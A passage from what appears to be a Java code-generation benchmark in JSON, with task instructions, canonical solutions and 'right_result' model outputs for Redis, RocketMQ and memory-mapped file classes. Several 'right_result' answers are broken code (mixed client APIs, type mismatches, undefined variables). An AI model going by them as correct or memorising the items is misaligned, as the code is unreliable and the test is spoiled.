    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.resource.Transports;\nimport io.lettuce.test.resource.TestClientResources;\nimport io.netty.util.internal.SystemPropertyUtil;\nimport java.io.File;\nimport java.io.IOException;\nimport java.util.Locale;\n\npublic class RedisSocketConnector {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n\n    public void connect(RedisURI redisURI) {\n        redisClient = RedisClient.create(TestClientResources.get(), redisURI);\n        connection = redisClient.connect();\n    }\n\n    public void performRedisAction(String key, String value) {\n        RedisCommands<String, String> syncCommands = connection.sync();\n        syncCommands.set(key, value);\n        String result = syncCommands.get(key);\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public static RedisURI createSocketRedisUri(String socketPath) throws IOException {\n        File file = new File(socketPath).getCanonicalFile();\n        return RedisURI.create(RedisURI.URI_SCHEME_REDIS_SOCKET + \"://\" + file.getCanonicalPath());\n    }\n\n    public static boolean isSupported() {\n        String osName = SystemPropertyUtil.get(\"os.name\").toLowerCase(Locale.UK).trim();\n        return Transports.NativeTransports.isDomainSocketSupported();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.params.SetParams;\n\npublic class RedisSocketConnector {\n    private Jedis jedis;\n\n    public void connect(String socketPath) {\n        this.jedis = new Jedis(socketPath);\n    }\n\n    public void performRedisAction(String key, String value) {\n        jedis.set(key, value);\n        String retrievedValue = jedis.get(key);\n        System.out.println(\"Retrieved Value: \" + retrievedValue);\n    }\n\n    public void close() {\n        if (jedis != null) {\n            jedis.close();\n        }\n    }\n\n    public static RedisURI createSocketRedisUri(String socketPath) {\n        return RedisURI.Builder.redis().withUnixDomainSocketAddress(Paths.get(socketPath)).build();\n    }\n\n    public static boolean isSupported() {\n        try {\n            Process process = Runtime.getRuntime().exec(\"uname -a\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                if (line.contains(\"Linux\")) {\n                    return true;\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return false;\n    }\n}\n```"
  },
  {
    "Task_id": 356,
    "Instruction": "Task Description: Implement a Redis Sentinel connection provider class in Java that manages connections to a Redis master node through Sentinel monitoring, including automatic failover handling.\n\nClass Description: SentineledConnectionProvider is a class that provides managed connections to a Redis master node in a Sentinel-monitored environment. It automatically discovers the current master through Sentinel nodes and maintains a connection pool to it. The class also includes a listener thread that monitors for master failover events and updates the connection pool accordingly.\n\nAttributes:\n- currentMaster: [HostAndPort] - The current master node's host and port\n- pool: [ConnectionPool] - The connection pool to the current master node\n- masterName: [String] - The name of the Redis master as configured in Sentinel\n- masterClientConfig: [JedisClientConfig] - Configuration for connections to the master node\n- sentinelClientConfig: [JedisClientConfig] - Configuration for connections to Sentinel nodes\n\nMethods:\n- SentineledConnectionProvider([String] masterName, [JedisClientConfig] masterClientConfig, [Set<HostAndPort>] sentinels, [JedisClientConfig] sentinelClientConfig) -> [void] - Constructor that initializes the connection provider with master name, configurations, and Sentinel nodes\n- getConnection() -> [Connection] - Retrieves a connection from the pool to the current master node\n- initMaster([HostAndPort] master) -> [void] - Initializes or updates the connection pool to the specified master node\n- initSentinels([Set<HostAndPort>] sentinels) -> [HostAndPort] - Discovers the current master node through Sentinel nodes\n- SentinelListener([HostAndPort] node) -> [void] - Nested class constructor for Sentinel listener thread\n- run() -> [void] - Main execution method of the Sentinel listener thread (overrides Thread.run())\n- shutdown() -> [void] - Shuts down the Sentinel listener thread",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisPubSub;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.IOUtils;\n\nimport java.util.Set;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class SentineledConnectionProvider {\n\n  private static final Logger LOG = LoggerFactory.getLogger(SentineledConnectionProvider.class);\n\n  private volatile HostAndPort currentMaster;\n  private volatile ConnectionPool pool;\n  private final String masterName;\n  private final JedisClientConfig masterClientConfig;\n  private final JedisClientConfig sentinelClientConfig;\n\n  public SentineledConnectionProvider(String masterName, final JedisClientConfig masterClientConfig,\n      Set<HostAndPort> sentinels, final JedisClientConfig sentinelClientConfig) {\n    this.masterName = masterName;\n    this.masterClientConfig = masterClientConfig;\n    this.sentinelClientConfig = sentinelClientConfig;\n\n    HostAndPort master = initSentinels(sentinels);\n    initMaster(master);\n  }\n\n  public Connection getConnection() {\n    return pool.getResource();\n  }\n\n  private void initMaster(HostAndPort master) {\n    if (!master.equals(currentMaster)) {\n      currentMaster = master;\n      pool = new ConnectionPool(currentMaster, masterClientConfig);\n      LOG.info(\"Created connection pool to master at {}.\", master);\n    }\n  }\n\n  private HostAndPort initSentinels(Set<HostAndPort> sentinels) {\n    HostAndPort master = null;\n    boolean sentinelAvailable = false;\n\n    for (HostAndPort sentinel : sentinels) {\n      try (Jedis jedis = new Jedis(sentinel, sentinelClientConfig)) {\n        List<String> masterAddr = jedis.sentinelGetMasterAddrByName(masterName);\n        sentinelAvailable = true;\n\n        if (masterAddr == null || masterAddr.size() != 2) {\n          continue;\n        }\n\n        master = new HostAndPort(masterAddr.get(0), Integer.parseInt(masterAddr.get(1)));\n        break;\n      } catch (JedisException e) {\n        LOG.warn(\"Could not get master address from {}.\", sentinel, e);\n      }\n    }\n\n    if (master == null) {\n      if (sentinelAvailable) {\n        throw new JedisException(\"Can connect to sentinel, but \" + masterName + \" seems to be not monitored.\");\n      } else {\n        throw new JedisConnectionException(\"All sentinels down, cannot determine where \" + masterName + \" is running.\");\n      }\n    }\n\n    return master;\n  }\n\n  protected class SentinelListener extends Thread {\n    protected final HostAndPort node;\n    protected volatile Jedis sentinelJedis;\n    protected AtomicBoolean running = new AtomicBoolean(false);\n\n    public SentinelListener(HostAndPort node) {\n      this.node = node;\n    }\n\n    @Override\n    public void run() {\n      running.set(true);\n\n      while (running.get()) {\n        try {\n          sentinelJedis = new Jedis(node, sentinelClientConfig);\n          sentinelJedis.subscribe(new JedisPubSub() {\n            @Override\n            public void onMessage(String channel, String message) {\n              String[] switchMasterMsg = message.split(\" \");\n              if (switchMasterMsg.length > 3 && masterName.equals(switchMasterMsg[0])) {\n                initMaster(new HostAndPort(switchMasterMsg[3], Integer.parseInt(switchMasterMsg[4])));\n              }\n            }\n          }, \"+switch-master\");\n        } catch (JedisException e) {\n          if (running.get()) {\n            try {\n              Thread.sleep(5000);\n            } catch (InterruptedException se) {\n              LOG.error(\"Sleep interrupted.\", se);\n            }\n          }\n        } finally {\n          IOUtils.closeQuietly(sentinelJedis);\n        }\n      }\n    }\n\n    public void shutdown() {\n      running.set(false);\n      if (sentinelJedis != null) {\n        sentinelJedis.close();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.params.SetParams;\n\nimport java.util.Set;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.TimeUnit;\n\npublic class SentineledConnectionProvider {\n    private HostAndPort currentMaster;\n    private ConcurrentHashMap<String, Jedis> pool = new ConcurrentHashMap<>();\n    private String masterName;\n    private JedisClientConfig masterClientConfig;\n    private JedisClientConfig sentinelClientConfig;\n    private ScheduledExecutorService executorService;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterClientConfig, Set<HostAndPort> sentinels, JedisClientConfig sentinelClientConfig) {\n        this.masterName = masterName;\n        this.masterClientConfig = masterClientConfig;\n        this.sentinelClientConfig = sentinelClientConfig;\n        this.executorService = Executors.newScheduledThreadPool(1);\n        initSentinels(sentinels);\n        executorService.scheduleAtFixedRate(() -> {\n            try {\n                updateMaster();\n            } catch (JedisException e) {\n                e.printStackTrace();\n            }\n        }, 0, 5, TimeUnit.SECONDS);\n    }\n\n    public Connection getConnection() {\n        return pool.get(currentMaster.toString()).getJedis();\n    }\n\n    private void initMaster(HostAndPort master) {\n        if (!master.equals(currentMaster)) {\n            currentMaster = master;\n            pool.put(master.toString(), new Jedis(master, masterClientConfig));\n        }\n    }\n\n    private HostAndPort initSentinels(Set<HostAndPort> sentinels) throws JedisException {\n        Jedis jedis = new Jedis(sentinels.iterator().next(), sentinelClientConfig);\n        try {\n            return jedis.sentinelGetMasterAddrByName(masterName);\n        } finally {\n            jedis.close();\n        }\n    }\n\n    private void updateMaster() throws JedisException {\n        HostAndPort newMaster = initSentinels(sentinels);\n        if (!newMaster.equals(currentMaster)) {\n            initMaster(newMaster);\n        }\n    }\n\n    private static class SentinelListener extends Thread {\n        private HostAndPort node;\n\n        public SentinelListener(HostAndPort node) {\n            this.node = node;\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                // Simulate listening for events\n                try {\n                    Thread.sleep(1000);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                }\n            }\n        }\n    }\n\n    public void shutdown() {\n        executorService.shutdownNow();\n        for (Jedis jedis : pool.values()) {\n            jedis.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 357,
    "Instruction": "Task Description: Implement a Redis-based broadcast service for inter-process communication that allows sending and receiving messages between different instances of an application.\n\nClass Description: RedisBroadcastService is a class that provides publish-subscribe functionality using Redis as the message broker. It handles message serialization/deserialization and ensures messages are only processed by other instances (not the sender).\n\nAttributes:\n- objectMapper: ObjectMapper - Used for JSON serialization/deserialization of messages\n- executorService: ExecutorService - Handles message reception in a separate thread\n- channel: String - The Redis channel name for pub/sub communication\n- subscriber: Jedis - Redis client for subscribing to messages\n- publisher: Jedis - Redis client for publishing messages\n- id: String - Unique identifier for this service instance to avoid processing own messages\n\nMethods:\n- RedisBroadcastService(Config config, ExecutorService executorService, ObjectMapper objectMapper) -> void - Constructor that initializes Redis connections\n- sendMessage(BroadcastMessage message) -> void - Publishes a message to the Redis channel\n- start() -> void - Starts the message receiver in a separate thread\n- stop() -> void - Closes Redis connections and cleans up resources\n- receiver: Runnable - Internal thread that handles incoming messages from Redis",
    "Canonical_solution": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\n\nimport java.io.IOException;\nimport java.util.UUID;\nimport java.util.concurrent.ExecutorService;\n\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPubSub;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\n\npublic class RedisBroadcastService extends BaseBroadcastService {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(RedisBroadcastService.class);\n\n    private final ObjectMapper objectMapper;\n    private final ExecutorService executorService;\n    private final String channel = \"traccar\";\n    private Jedis subscriber;\n    private Jedis publisher;\n    private final String id = UUID.randomUUID().toString();\n\n    public RedisBroadcastService(\n            Config config, ExecutorService executorService, ObjectMapper objectMapper) throws IOException {\n        this.executorService = executorService;\n        this.objectMapper = objectMapper;\n        String url = config.getString(Keys.BROADCAST_ADDRESS);\n\n        try {\n            subscriber = new Jedis(url);\n            publisher = new Jedis(url);\n            subscriber.connect();\n        } catch (JedisConnectionException e) {\n            throw new IOException(e);\n        }\n    }\n\n    @Override\n    protected void sendMessage(BroadcastMessage message) {\n        try {\n            String payload = id  + \":\" + objectMapper.writeValueAsString(message);\n            publisher.publish(channel, payload);\n        } catch (IOException | JedisConnectionException e) {\n            LOGGER.warn(\"Broadcast failed\", e);\n        }\n    }\n\n    @Override\n    public void start() throws IOException {\n        executorService.submit(receiver);\n    }\n\n    @Override\n    public void stop() {\n        try {\n            if (subscriber != null) {\n                subscriber.close();\n                subscriber = null;\n            }\n        } catch (JedisException e) {\n            LOGGER.warn(\"Subscriber close failed\", e);\n        }\n        try {\n            if (publisher != null) {\n                publisher.close();\n                publisher = null;\n            }\n        } catch (JedisException e) {\n            LOGGER.warn(\"Publisher close failed\", e);\n        }\n    }\n\n    private final Runnable receiver = new Runnable() {\n        @Override\n        public void run() {\n            try {\n                subscriber.subscribe(new JedisPubSub() {\n                    @Override\n                    public void onMessage(String messageChannel, String message) {\n                        try {\n                            String[] parts = message.split(\":\", 2);\n                            if (messageChannel.equals(channel) && parts.length == 2 && !id.equals(parts[0])) {\n                                handleMessage(objectMapper.readValue(parts[1], BroadcastMessage.class));\n                            }\n                        } catch (Exception e) {\n                            LOGGER.warn(\"Broadcast handleMessage failed\", e);\n                        }\n                    }\n                }, channel);\n            } catch (JedisException e) {\n                throw new RuntimeException(e);\n            }\n        }\n    };\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class RedisBroadcastService {\n    private final ObjectMapper objectMapper;\n    private final ExecutorService executorService;\n    private final String channel;\n    private final Jedis subscriber;\n    private final Jedis publisher;\n    private final String id;\n\n    public RedisBroadcastService(Config config, ExecutorService executorService, ObjectMapper objectMapper) {\n        this.objectMapper = objectMapper;\n        this.executorService = executorService;\n        this.channel = config.getChannel();\n        this.subscriber = new Jedis(config.getRedisHost(), config.getRedisPort());\n        this.publisher = new Jedis(config.getRedisHost(), config.getRedisPort());\n        this.id = UUID.randomUUID().toString();\n    }\n\n    public void sendMessage(BroadcastMessage message) {\n        try {\n            String jsonMessage = objectMapper.writeValueAsString(message);\n            publisher.publish(channel, jsonMessage);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        executorService.submit(receiver);\n    }\n\n    public void stop() {\n        subscriber.close();\n        publisher.close();\n        executorService.shutdown();\n    }\n\n    private Runnable receiver = () -> {\n        subscriber.subscribe((channel, message) -> {\n            try {\n                BroadcastMessage receivedMessage = objectMapper.readValue(message, BroadcastMessage.class);\n                if (!id.equals(receivedMessage.getSourceId())) {\n                    processMessage(receivedMessage);\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }, channel);\n    };\n\n    private void processMessage(BroadcastMessage message) {\n        // Process the message here\n    }\n}\n```"
  },
  {
    "Task_id": 358,
    "Instruction": "Task Description: Create a Redis connection manager class that handles both standalone and cluster Redis connections with authentication support, including connection initialization, creation of different connection types, and proper resource cleanup.\n\nClass Description: The RedisConnectionManager class provides centralized management for Redis connections, supporting both standalone and cluster configurations with token-based authentication. It handles connection lifecycle management and provides methods to create different types of Redis connections.\n\nAttributes:\n\nclientOptions: [ClusterClientOptions] - Configuration options for Redis client connections\ncredentialsProvider: [TokenBasedRedisCredentialsProvider] - Provider for token-based authentication credentials\nclient: [RedisClient] - Client instance for standalone Redis connections\nclusterClient: [RedisClusterClient] - Client instance for Redis cluster connections\n\nMethods:\n\ninitializeConnection: [Name]([EntraIdTestContext testCtx]) -> [void] - Initializes Redis client instances with connection options and authentication configuration\ncreateStandaloneConnection: [Name]() -> [StatefulRedisConnection<String, String>] - Creates and returns a new standalone Redis connection\ncreateClusterConnection: [Name]() -> [StatefulRedisClusterConnection<String, String>] - Creates and returns a new Redis cluster connection\ncreatePubSubConnection: [Name]() -> [StatefulRedisPubSubConnection<String, String>] - Creates and returns a new Redis Pub/Sub connection\ncloseConnections: [Name]() -> [void] - Closes all active connections and releases resources",
    "Canonical_solution": "import io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.SocketOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport io.lettuce.core.cluster.ClusterClientOptions;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport redis.clients.authentication.core.TokenAuthConfig;\nimport redis.clients.authentication.entraid.EntraIDTokenAuthConfigBuilder;\nimport redis.clients.authentication.core.TokenBasedRedisCredentialsProvider;\n\npublic class RedisConnectionManager {\n\n    private ClusterClientOptions clientOptions;\n    private TokenBasedRedisCredentialsProvider credentialsProvider;\n    private RedisClient client;\n    private RedisClusterClient clusterClient;\n\n    public void initializeConnection(EntraIdTestContext testCtx) {\n        clientOptions = ClusterClientOptions.builder()\n                .socketOptions(SocketOptions.builder().connectTimeout(Duration.ofSeconds(1)).build())\n                .timeoutOptions(TimeoutOptions.enabled(Duration.ofSeconds(1)))\n                .reauthenticateBehavior(ClientOptions.ReauthenticateBehavior.ON_NEW_CREDENTIALS).build();\n\n        TokenAuthConfig tokenAuthConfig = EntraIDTokenAuthConfigBuilder.builder().clientId(testCtx.getClientId())\n                .secret(testCtx.getClientSecret()).authority(testCtx.getAuthority()).scopes(testCtx.getRedisScopes())\n                .expirationRefreshRatio(0.0000001F).build();\n\n        credentialsProvider = TokenBasedRedisCredentialsProvider.create(tokenAuthConfig);\n\n        RedisURI uri = RedisURI.builder().withHost(testCtx.host()).withPort(testCtx.port())\n                .withAuthentication(credentialsProvider).build();\n\n        client = RedisClient.create(uri);\n        client.setOptions(clientOptions);\n\n        RedisURI clusterUri = RedisURI.builder().withHost(testCtx.clusterHost().get(0)).withPort(testCtx.clusterPort())\n                .withAuthentication(credentialsProvider).build();\n        clusterClient = RedisClusterClient.create(clusterUri);\n        clusterClient.setOptions(clientOptions);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return client.connect();\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        return clusterClient.connect();\n    }\n\n    public StatefulRedisPubSubConnection<String, String> createPubSubConnection() {\n        return client.connectPubSub();\n    }\n\n    public void closeConnections() {\n        if (credentialsProvider != null) {\n            credentialsProvider.close();\n        }\n        if (client != null) {\n            client.close();\n        }\n        if (clusterClient != null) {\n            clusterClient.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.JedisShardInfo;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisCluster;\nimport redis.clients.jedis.params.ClientOutputBufferLimitParams;\n\npublic class RedisConnectionManager {\n    private ClusterClientOptions clientOptions;\n    private TokenBasedRedisCredentialsProvider credentialsProvider;\n    private JedisPool jedisPool;\n    private JedisCluster jedisCluster;\n\n    public void initializeConnection(EntraIdTestContext testCtx) {\n        // Initialize client options and credentials provider\n        clientOptions = ClusterClientOptions.builder()\n                .outputBufferLimit(ClientOutputBufferLimitParams.outputBufferLimit())\n                .build();\n        credentialsProvider = new TokenBasedRedisCredentialsProvider(testCtx.getToken());\n\n        // Initialize standalone connection pool\n        jedisPool = new JedisPool(new JedisPoolConfig(), testCtx.getRedisHost(), testCtx.getRedisPort(),\n                2000, credentialsProvider.getCredentials().getPassword());\n\n        // Initialize cluster connection\n        Set<HostAndPort> nodes = new HashSet<>();\n        nodes.add(new HostAndPort(testCtx.getRedisClusterNode1(), testCtx.getRedisClusterPort()));\n        nodes.add(new HostAndPort(testCtx.getRedisClusterNode2(), testCtx.getRedisClusterPort()));\n        jedisCluster = new JedisCluster(nodes, 2000, 5, 3, credentialsProvider.getCredentials().getPassword());\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return jedisPool.getResource();\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        return jedisCluster.getStatefulConnection();\n    }\n\n    public StatefulRedisPubSubConnection<String, String> createPubSubConnection() {\n        return jedisPool.getResource().getPubSubConnection();\n    }\n\n    public void closeConnections() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n        if (jedisCluster != null) {\n            jedisCluster.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 359,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer to subscribe to messages from a specified topic and process them asynchronously.\n\nClass Description: The SimpleConsumer class provides a basic implementation of a RocketMQ push consumer. It handles the setup, subscription, message listening, and lifecycle management of a consumer instance. The class allows for easy configuration of consumer group, NameServer address, topic subscription, and message processing logic.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- SimpleConsumer(String consumerGroup, String namesrvAddr) -> void - Constructor that initializes the consumer with a consumer group and NameServer address\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a message listener to handle incoming messages\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully\n- createDefaultListener() -> MessageListenerConcurrently - Static factory method that creates a default message listener which prints received messages",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport java.util.List;\n\npublic class SimpleConsumer {\n    private DefaultMQPushConsumer consumer;\n\n    public SimpleConsumer(String consumerGroup, String namesrvAddr) {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static MessageListenerConcurrently createDefaultListener() {\n        return new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                for (MessageExt msg : msgs) {\n                    System.out.println(msg.getKeys() + \":\" + new String(msg.getBody()));\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class SimpleConsumer {\n    private DefaultMQPushConsumer consumer;\n\n    public SimpleConsumer(String consumerGroup, String namesrvAddr) throws Exception {\n        this.consumer = new DefaultMQPushConsumer(consumerGroup);\n        this.consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) throws Exception {\n        this.consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        this.consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws Exception {\n        this.consumer.start();\n    }\n\n    public void shutdown() {\n        this.consumer.shutdown();\n    }\n\n    public static MessageListenerConcurrently createDefaultListener() {\n        return new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                for (MessageExt msg : msgs) {\n                    System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), new String(msg.getBody()));\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        };\n    }\n}\n```"
  },
  {
    "Task_id": 36,
    "Instruction": "Task Description: Implement a memory-mapped file-based key-value store for long-to-long mappings using Java NIO's FileChannel and MappedByteBuffer.\n\nClass Description: ArrayLongLongMapMmap provides a memory-efficient way to store and retrieve long-to-long mappings using memory-mapped files. It segments large files into manageable chunks for efficient random access.\n\nAttributes:\n- path: Path - The filesystem path where the memory-mapped file will be stored\n- writeChannel: FileChannel - Channel for writing to the file during initialization\n- segmentsArray: MappedByteBuffer[] - Array of memory-mapped buffers for reading data\n- readChannel: FileChannel - Channel for reading from the file after initialization\n\nMethods:\n- ArrayLongLongMapMmap(Path path, boolean madvise) - Constructor - Initializes the map with the given file path\n- init() -> void - Initializes the memory mapping by closing the write channel and opening read channels with segmented mappings\n- get(long key) -> long - Retrieves the value associated with the given key from memory-mapped segments\n- close() -> void - Cleans up resources including unmapping buffers and closing channels, then deletes the file\n\nThe implementation uses memory-mapped files (1<<27 byte segments) for efficient random access to large datasets while minimizing memory usage. The close() method ensures proper resource cleanup including buffer unmapping and file deletion.",
    "Canonical_solution": "import com.onthegomap.planetiler.util.ByteBufferUtil;\nimport com.onthegomap.planetiler.util.FileUtils;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.Semaphore;\n\nclass ArrayLongLongMapMmap {\n\n  private final Path path;\n  private FileChannel writeChannel;\n  private MappedByteBuffer[] segmentsArray;\n  private FileChannel readChannel = null;\n\n  ArrayLongLongMapMmap(Path path, boolean madvise) {\n    this.path = path;\n    try {\n      writeChannel = FileChannel.open(path, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  public void init() {\n    try {\n      writeChannel.close();\n      readChannel = FileChannel.open(path, StandardOpenOption.READ);\n      segmentsArray = ByteBufferUtil.mapFile(readChannel, readChannel.size(), 1L << 27, false, null);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  @Override\n  public long get(long key) {\n    long byteOffset = key << 3;\n    int idx = (int) (byteOffset >>> 27);\n    if (idx >= segmentsArray.length) {\n      return 0;\n    }\n    MappedByteBuffer mappedByteBuffer = segmentsArray[idx];\n    if (mappedByteBuffer == null) {\n      return 0;\n    }\n    int offset = (int) (byteOffset & ((1L << 27) - 1));\n    return mappedByteBuffer.getLong(offset);\n  }\n\n  @Override\n  public void close() throws IOException {\n    if (segmentsArray != null) {\n      ByteBufferUtil.free(segmentsArray);\n      segmentsArray = null;\n    }\n    if (writeChannel != null) {\n      writeChannel.close();\n      writeChannel = null;\n    }\n    if (readChannel != null) {\n      readChannel.close();\n      readChannel = null;\n    }\n    FileUtils.delete(path);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class ArrayLongLongMapMmap {\n    private final Path path;\n    private FileChannel writeChannel;\n    private MappedByteBuffer[] segmentsArray;\n    private FileChannel readChannel;\n\n    public ArrayLongLongMapMmap(Path path, boolean madvise) throws IOException {\n        this.path = path;\n        this.writeChannel = FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n        if (!madvise) {\n            writeChannel.force(true);\n        }\n    }\n\n    public void init() throws IOException {\n        writeChannel.close();\n        long fileSize = 0;\n        try (FileChannel tempReadChannel = FileChannel.open(path, StandardOpenOption.READ)) {\n            fileSize = tempReadChannel.size();\n        }\n        int segmentCount = (int) Math.ceil((double) fileSize / (1 << 27));\n        segmentsArray = new MappedByteBuffer[segmentCount];\n        readChannel = FileChannel.open(path, StandardOpenOption.READ);\n        for (int i = 0; i < segmentCount; i++) {\n            long position = (long) i * (1 << 27);\n            long size = Math.min(1L << 27, fileSize - position);\n            segmentsArray[i] = readChannel.map(FileChannel.MapMode.READ_ONLY, position, size);\n        }\n    }\n\n    public long get(long key) throws IOException {\n        int segmentIndex = (int) (key >>> 27);\n        long offsetInSegment = key & ((1 << 27) - 1);\n        if (segmentIndex >= segmentsArray.length || offsetInSegment >= segmentsArray[segmentIndex].limit()) {\n            throw new IndexOutOfBoundsException(\"Key out of bounds\");\n        }\n        segmentsArray[segmentIndex].position((int) offsetInSegment);\n        return segmentsArray[segmentIndex].getLong();\n    }\n\n    public void close() throws IOException {\n        for (MappedByteBuffer segment : segmentsArray) {\n            if (segment != null) {\n                segment.clear();\n            }\n        }\n        if (readChannel != null) {\n            readChannel.close();\n        }\n        if (writeChannel != null) {\n            writeChannel.close();\n        }\n        path.toFile().delete();\n    }\n}\n```"
  },
  {
    "Task_id": 360,
